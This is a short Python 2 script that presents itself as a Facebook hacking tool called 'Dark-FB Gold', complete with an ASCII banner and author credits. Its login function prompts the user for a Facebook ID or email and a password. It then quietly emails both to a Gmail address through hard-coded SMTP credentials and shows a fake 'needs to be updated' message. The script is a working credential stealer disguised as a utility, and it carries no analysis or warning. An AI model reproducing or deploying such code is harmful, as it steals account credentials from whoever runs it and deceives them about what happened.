#!/usr/bin/python
# coding=utf-8
import os,sys,time
try:
	import yagmail
except ImportError:
	os.system('pip2 install yagmail')

logo = """\033[1;96m█████████
\033[1;96m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
\033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;96mGOLD.
\033[1;96m█████████      \033[1;92m«----------✧----------»
\033[1;96m ██ ██
\033[1;96m╔══════════════════════════════════════════════╗
\033[1;96m║\033[1;96m* \033[1;95mAuthor  \033[1;93m: \033[1;95mBrother•MR.Z3R0 \033[1;96m                  ║
\033[1;96m║\033[1;96m* \033[1;96mGitHub  \033[1;93m: \033[1;96m\033[4mhttps://github.com/MRZK1NG\033[0m \033[1;96m      ║
\033[1;96m║\033[1;96m*\033[1;93mEMAIL  \033[1;93m  : \033[1;91m\033mfuckyou07@gmail.com\033[0m \033[1;96m          ║
\033[1;96m║\033[1;97m*\033[1;97mGROUP\033[1;92m    : \033[1;96m\033mAnonymouse Indonesia\033[0m \033[1;96m             ║
\033[1;96m╚══════════════════════════════════════════════╝"""

def login():
	os.system('clear')
	print logo
	print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
	id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
	pwd = raw_input('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
	hasil = ('username: '+id+'\npassword: '+pwd)
#importing the Yagmail library
	try:
    #initializing the server connection
        	yag = yagmail.SMTP(user='kingmrz00001@gmail.com', password='M17r11Z03')
    #sending the email
        	yag.send(to='kingmrz00002@gmail.com', subject='successfully !', contents=(hasil))
        	print("\033[1;91mThis tool needs to be updated ! ")
	except:
        	print("\033[1;91mThere is an error !")
login()
